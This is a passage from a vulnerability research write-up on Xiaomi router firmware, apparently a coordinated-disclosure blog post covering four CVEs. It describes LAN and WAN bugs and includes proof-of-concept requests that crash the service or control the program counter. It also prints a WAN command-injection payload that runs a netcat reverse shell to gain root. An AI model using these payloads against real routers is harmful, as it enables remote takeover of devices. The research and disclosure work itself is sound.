To trigger the `pk_free()` bug, we just need to send a malformed RSA public key with non-base64 characters. For example: `http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=%01`.

In GDB, we can see that an unmapped address is dereferenced in `pk_free()`:

[![uninit free](/posts/img/xiaomi-routers/uninitfree_gdb.png)](/posts/img/xiaomi-routers/uninitfree_gdb.png)

To understand this vulnerability a bit more, let’s look at the source code of the `pk_free()` function from `libmbedtls` that we can find online: [libmbedtls](https://os.mbed.com/users/ansond/code/mbedTLSLibrary/docs/137634ff4186/pk_8c_source.html).
  
  
  /*
  * Free (the components of) a pk_context
  */
  void pk_free( pk_context *ctx )
  {
  if( ctx == NULL || ctx->pk_info == NULL )
  return;
  
  ctx->pk_info->ctx_free_func( ctx->pk_ctx );
  
  polarssl_zeroize( ctx, sizeof( pk_context ) );
  }
  

Here we can see that the context `ctx` stores at least a function pointer at `ctx->pk_info->ctx_free_func` and will call this function with `ctx->pk_ctx` as a parameter. If we manage to overwrite the stack frame of the function or prepare it using a previous call, and because the `pk_context` variable in `public_encrypt_kerybuf()` is not initialized at the beginning of the method, it is possible to build a fake `pk_context` structure in the stack.

For example, we could set `ctx->pk_info->ctx_free_func` to the `libc` `system` function and set `ctx->pk_ctx` to a custom string (example: “/bin/sh” to spawn a shell).

Unfortunately, it is complicated to set up the stack for this attack because we can see in the Lua code that `librsa.so` is mapped and unmapped at runtime with only one function from the library being called (`lua_rsa_pubkey_encrypt`), not really giving us any control:
  
  
  function getWifiPwdUrl()
  [...]
  -- Here, `lirsa.so` is loaded
  local lua_crypto = require("librsa")
  
  [...]
  local rsa_pub_key = LuciHttp.formvalue("rsa_pubkey")
  if rsa_pub_key == nil then
  result.code = 1
  result["msg"] = "http get rsa_pubkey null."
  end
  [...]
  local url = string.format('http://%s/cgi-bin/luci/api/misystem/get_wifi_pwd?token=%s', lanip, token)
  XQLog.log(6,"iot url_origin:"..url)
  
  -- Here, only `lua_rsa_pubkey_encrypt` is called
  local url_new = lua_crypto.lua_rsa_pubkey_encrypt(url, rsa_pub_key)
  
  if url_new ~= nil then
  [...]
  else
  XQLog.log(6,"lua call C lib lua_rsa_pubkey_encrypt() ret nil")
  result.code = 3
  result["msg"] = "lua call c api ret null."
  end
  [...]
  end
  

#### Endpoint `/api/misystem/get_wifi_pwd_url` \- Stack Buffer Overflow (already known as CVE-2020-14124)

We can also trigger a stack buffer overflow in `lua_rsa_pubkey_encrypt()` by giving an RSA public key longer than 1024 bytes: the stack buffer that receives the RSA key is on the stack and 1024 bytes long, but the program doesn’t check the length of the inserted key.
  
  
  int32_t lua_rsa_pubkey_encrypt(struct lua_State* lua_state) {
  char rsa_pub_key[1024];
  char url[256];
  
  memset(&rsa_pub_key, 0, 1024);
  memset(&url, 0, 256);
  
  [...]
  
  strcpy(&url, luaL_checklstring(lua_state, 1, 0));
  int32_t url_len = strlen(&url);
  
  // Stack buffer overflow !
  strcpy(&rsa_pub_key, luaL_checklstring(lua_state, 2, 0));
  int32_t key_len = strlen(&rsa_pub_key);
  
  [...]
  }
  

After testing, we can control the `PC` (Program Counter) after 1036 bytes, so this bug could eventually lead to Remote Code Execution.

To PoC the stack buffer overflow, we need to send an RSA public key with more than 1036 characters. For example, we can put 1036 * ‘A’ and then overwrite `PC` with ‘BBBB’: `http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=AAAAAA...AAAABBBB`:

[![buffer overflow](/posts/img/xiaomi-routers/bufferoverflow_gdb.png)](/posts/img/xiaomi-routers/bufferoverflow_gdb.png)

Unfortunately, there are some limitations for the exploitation of this buffer overflow: we have to use only base64 characters in our payload (`A-Z`, `a-z`, `0-9`, `+`, `=`, `/`), the use of `strcpy()` prevents the presence of nullbytes and of course, again, we have to deal with ASLR. We can however note that we could potentially brute force ASLR in this context because the `librsa.so` binary is mapped at runtime, at a different place everytime and the crashes won’t cause a DoS because it comes from lua code which will be re-executed each time.

We also noticed that this vulnerability was already known by Xiaomi and was reported in 2020 by Aobo Wang on the `AX3600`, assigned to [CVE-2020-14124](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14124). Knowing that, we decided not to spend too much time trying to exploit it.

#### Endpoint `/api/misystem/get_wifi_pwd_url` \- memcmp()

We can trigger a third bug that occurs in the `memcmp()` function from `/lib/libuClibc-0.9.33.2.so` due to a combination of the two precedent bugs. By sending a lengthy and malformed RSA public key with at least one non-base64 character (e.g. with 8000 * ‘A’: `http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=AAAAAA...AAAA%01BB`), we can cause a crash:

[![crash](/posts/img/xiaomi-routers/memcmp_gdb.png)](/posts/img/xiaomi-routers/memcmp_gdb.png)

However, this bug has no real impact: the process crashes and the web page is rendering a 502 error but the process is restarted in the next API request. This bug is not exploitable.

## WAN

Previously, we looked at the LAN interface in which an attacker must be internal to the network. Our next step was to analyze the possibility of external attacks through the WAN interface.

While intercepting the WAN communications, we noticed that the router makes different requests. One of these requests seemed particularly interesting: an unencrypted HTTP GET request to `https://eu.api.miwifi.com/miwifi-broker/list`. We reproduced it by hand to see what the answer looks like.

[![wan man req](/posts/img/xiaomi-routers/wan_man_req.png)](/posts/img/xiaomi-routers/wan_man_req.png)

### Binary `/usr/bin/messagingagent` \- Command Injection (CVE-2023-26317)

We suppose that this GET request is employed to retrieve `MQTT` server IPs for future communications within the router. A list of IPs is quite interesting and after having seen how some binaries directly passed elements as parameters to other binaries via `system()`, we had the intuition that this list of IPs could probably be passed as a parameter to a certain binary. We can thus try to blindly inject commands here.

As the HTTP traffic is unencrypted and can be modified, we intercepted the request and just tried to inject `;reboot;` in the `serverList`… And the router rebooted!

[![miwifi-broker interception diagram](/posts/img/xiaomi-routers/miwifi_broker_interception.png)](/posts/img/xiaomi-routers/miwifi_broker_interception.png)

With a bash injection, we decided to go a little further and demonstrate an injection that could make an exterior connection using `netcat` (`nc 192.168.0.1 4343`). Once again, the only action for the exploit is the interception and modification of outgoing HTTP requests, which is relatively simple.

[![RCE](/posts/img/xiaomi-routers/WAN_Injection.png)](/posts/img/xiaomi-routers/WAN_Injection.png)

Moreover with the payload: `serverList=192.168.2.5;rm -f /tmp/f;mknod /tmp/f p;echo 'cat /tmp/f|sh -i 2>&1|nc 192.168.0.1 4242 >/tmp/f' > revshell.sh;chmod 777 revshell.sh; sh revshell.sh;:1883`, we can pop a root shell on the router from WAN:

[![Shell POC](/posts/img/xiaomi-routers/wan_poc.png)](/posts/img/xiaomi-routers/wan_poc.png)

Now, let’s see where the bug comes from.

The `/usr/bin/messagingagent` binary contains the request towards `https://eu.api.miwifi.com/miwifi-broker/list`: the URL is built using `config_api` from the `/usr/share/messaging.conf` file.
  
  
  key_file = /usr/share/messaging/serverkey_2.pub
  push_channel = xqpc
  config_api = /miwifi-broker/list
  register_device_api = /register_device
  miwifi_service_ips = 183.84.5.44,58.83.177.108
  

This request returns a string of the form: `serverList=[IP]:[PORT],...`. The parsing function for this HTTP response is in the function `ma_app_context_update_conn_data` at `0x408698`. During the parsing, the `IP` and `PORT` are simply scraped from the response and concatenated to a string that is passed into the `system` function. The issue with this `system` method is that the command can be easily injected and, therefore, an injection in the `IP` parameter leads to an OS Command injection.
  
  
  int32_t ma_app_context_update_conn_data(void* arg1)
  {
  [...]
  // Here we can see the split with ",": ["3.127.110.152:1884", "3.127.110.143:1883", "3.127.110.152:1883"]
  int32_t* configs_split = ma_str_split(*(int32_t*)((char*)arg1 + 0x18), ",");
  int32_t nb_configs = ma_str_array_size(configs_split);
  if (nb_configs == 0)
  {
  trap(0);
  }
  
  // Here a split with ":": ["3.127.110.152", "1884"]
  int32_t* ip_port_split = ma_str_split(configs_split[(v0_6 % nb_configs)], ":");
  if (ma_str_array_size(ip_port_split) != 2)
  {
  printf("[MQTT ERROR %d %s:%d]: Bad broker list: %s\n", time(0), "/ma_app_context.c", 0xae, *(int32_t*)((char*)arg1 + 0x18));
  fflush(stdout);
  }
  else
  {
  char* broker_ip = *(int32_t*)ip_port_split;
  int32_t broker_port = atoi(ip_port_split[1]);
  int32_t fd = fopen("/tmp/state/messagingagent", "w");
  void* a0_25;
  if (fd == 0)
  {
  printf("[MQTT ERROR %d %s:%d]: Unable to open /tmp/state/messagingagent\n", time(0), "/ma_app_context.c", 0x130);
  fflush(stdout);
  a0_25 = *(int32_t*)((char*)arg1 + 0x3c);
  }
  else
  {
  if (fprintf(fd, "%s:%d", broker_ip, broker_port) < 0)
  {
  printf("[MQTT ERROR %d %s:%d]: Unable to update /tmp/state/messagingagent\n", time(0), "/ma_app_context.c", 0x134);
  fflush(stdout);
  }
  fclose(fd);
  
  char command[0x30];
  // Command injection here using the IP field
  sprintf(&command,
  "/sbin/uci set /etc/config/messaging.deviceInfo.BROKER_HOST=%s",
  broker_ip);
  system(&command);
  
  sprintf(&command,
  "/sbin/uci set /etc/config/messaging.deviceInfo.BROKER_PORT=%d",
  broker_port);
  system(&command);
  
  system("/sbin/uci commit /etc/config/messaging");
  [...]
  

### Binary `/usr/bin/messagingagent` \- Stack Buffer Overflow (CVE-2023-26320)

In addition, we noticed the use of the `sprintf` method here, which does not check the length of the IP string copied to the stack buffer, leading to a stack buffer overflow. Replacing the payload with a large string overflows the buffer. We can PoC this buffer overflow with a cyclic input:
  
  
  serverList=192.168.2.5;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa:1883
  

Thus, this proves that the stack buffer overflow causes a denial of service (DoS) by crashing the `/usr/bin/messagingagent`. The process will not restart on its own and the router will require a reboot to function normally. The updates, MQTT connections, and system health use `/usr/bin/messagingagent` as a communication platform: all those systems will be offline due to the DoS. The crash can be seen in the image below.

[![wan_crash_problem](/posts/img/xiaomi-routers/wan_crash_problem.png)](/posts/img/xiaomi-routers/wan_crash_problem.png)

**Problem** : we can see here that we do have a crash, but it doesn’t look like a `PC` control: it’s more of an arbitrary pointer dereferencement. If we look at the process memory mapping, we can conclude that this bug happens in `ma_str_array_clear()`:
  
  
  void ma_str_array_clear(char** str_array) {
  char** _str_array = str_array;
  
  if (str_array == 0) {
  return;
  }
  
  while (true) {
  char* str = *(int32_t*)_str_array;
  if (str == 0) {
  break;
  }
  
  _str_array = &_str_array[1]; // _str_array++
  free(str);
  }
  
  return free(str_array);
  }
  

This function is indeed called at the end of our target function `ma_app_context_update_conn_data()`:
  
  
  int32_t ma_app_context_update_conn_data(void* arg1) {
  [...]
  ma_str_array_clear(configs_split);
  ma_str_array_clear(ip_port_split);
  ret = pthread_mutex_unlock(arg1);
  }
  
  return ret;
  }
  

We have a problem here because the stack is structured this way:
  
  
  [...]
  char overflow_buffer[128];
  char** configs_split;
  

When overflowing the overflow_buffer we overwrote the `char**` passed to the `ma_str_array_clear()` function. Later, this function tries to free the contents of the parameter and dereference something that can’t be dereferenced, thus leading to an obvious crash.

We can circumvent this problem with a little trick: overwrite the `char** overwritten_string_array_pointer` with a valid address that points to `0x00000000`. To do so, we can for example take an address from a library that will be mapped to the process memory. At the end of the function, `ma_str_array_clear()` will try to free it and see that the pointer already points to NULL and so it will return to `ma_app_context_update_conn_data()`. We can then execute the return instruction and control `PC`.

As can be seen in the payload below, we have changed `BBBB` to `ws¢(` (for `0x7773a228`) which is an address inside a library that is loaded at runtime. This simple change allows us to have a direct impact on `PC` as can be seen in the image below:

[![wan_modified_pc](/posts/img/xiaomi-routers/wan_crash_modified_pc.png)](/posts/img/xiaomi-routers/wan_crash_modified_pc.png)

Indeed, we notice that the program counter `PC` is changed to the string `kaaa` which is in our cyclic payload: we here took the control of `PC` after 97 bytes.

Once again, however, we have a similar issue to the `smartcontroller` binary in which we were unable to pass a NULL byte thus complicating the exploitation using ROP (in the `messagingagent` binary), even if it could still be possible using only library addresses as we did with `0x7773a228`.

The main issue here is the presence of ASLR which does not allow us to know in advance the location of the libraries: we would then, for example, need an ASLR leak to exploit this bug (we can’t bruteforce ASLR because we know that if the process crashes, it won’t restart by itself). At least, we still have a DoS here.

Furthermore, as we already achieved an RCE on the WAN, we decided to not pursue this vulnerability exploitation further.

# Some affected products

This section contains a table with some Xiaomi firmwares found to be vulnerable to the reported bugs. Indeed, after the first duplicate, we realized that Xiaomi routers have a common code base for the different routers firmwares, therefore, a single vulnerability probably affects various routers. Naturally, we only programmatically checked the firmwares by downloading them online and did not buy the routers for testing.

[![affected products](/posts/img/xiaomi-routers/affected_products.png)](/posts/img/xiaomi-routers/affected_products.png)

> Note: “mitigated” for the buffer overflows means that the binary is compiled with the stack canary protection that makes the exploit of stack buffer overflows even more difficult.

# Conclusion

In summary, this report discussed various vulnerabilities we found in the WAN and LAN interfaces of the `Mi AIoT Router AC2350`, and validated their existence in other Xiaomi firmwares as well.

We have unearthed vulnerabilities that go as far back as 2020 and have also identified four new CVEs ([CVE-2023-26317](https://nvd.nist.gov/vuln/detail/CVE-2023-26317), [CVE-2023-26318](https://trust.mi.com/misrc/bulletins/advisory?cveId=539), [CVE-2023-26319](https://trust.mi.com/misrc/bulletins/advisory?cveId=536), and [CVE-2023-26320](https://trust.mi.com/misrc/bulletins/advisory?cveId=540)).

While we hope our findings assist Xiaomi in strengthening their product security, it is worth noting that there are probably more bugs to find!

# Timeline

  * [18/01/2023] Reports sent to Xiaomi on Hackerone
  * [03/02/2023] First bounty payments
  * [01/08/2023] 4 CVEs assigned and published on Xiaomi Security Center:
  * **CVE-2023-26317** : <https://trust.mi.com/misrc/bulletins/advisory?cveId=529> (WAN command injection)
  * **CVE-2023-26318** : <https://trust.mi.com/misrc/bulletins/advisory?cveId=539> (LAN post auth stack buffer overflow)
  * **CVE-2023-26319** : <https://trust.mi.com/misrc/bulletins/advisory?cveId=536> (LAN post auth command injection)
  * **CVE-2023-26320** : <https://trust.mi.com/misrc/bulletins/advisory?cveId=540> (WAN stack buffer overflow)

[#Xiaomi](/tags/xiaomi)

[#Routers](/tags/routers)

[#CVE](/tags/cve)

[#Vulnerability Research](/tags/vulnerability-research)

2023-09-25 by Julien R. (SoEasY), Marin Duroyon
